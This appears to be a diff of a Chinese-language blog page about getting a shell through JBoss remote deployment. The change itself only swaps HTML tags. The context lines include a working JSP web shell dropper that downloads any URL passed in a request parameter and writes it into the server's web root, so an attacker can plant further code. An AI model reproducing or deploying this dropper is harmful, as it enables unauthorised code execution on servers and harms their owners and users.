@@ -23,7 +23,7 @@
     <a href="/" id="title"></a>
 	</h1>
 	</div>
-<div id="md" style="display: none;">
+<xmp id="md" style="display: none;">
 <!-- markdown -->
 Jboss 远程部署 getshell 有时候会爆 `org.jboss.web.tomcat.filters.ReplyHeaderFilter.doFilter` 的错误
 
@@ -55,7 +55,7 @@ Jboss 远程部署 getshell 有时候会爆 `org.jboss.web.tomcat.filters.ReplyH
 <% if(request.getParameter("u")!=null){java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();byte[] b = new byte[1024];java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();int a = -1;while ((a = in.read(b)) != -1) {baos.write(b, 0, a);}new java.io.FileOutputStream(application.getRealPath("/")+"/"+ request.getParameter("f")).write(baos.toByteArray());}%>
 ```
 <!-- markdown end -->
-</div>
+</xmp>
 <div class="entry" id="main">
 <!-- content -->
 <p>Jboss 远程部署 getshell 有时候会爆 <code>org.jboss.web.tomcat.filters.ReplyHeaderFilter.doFilter</code> 的错误</p>
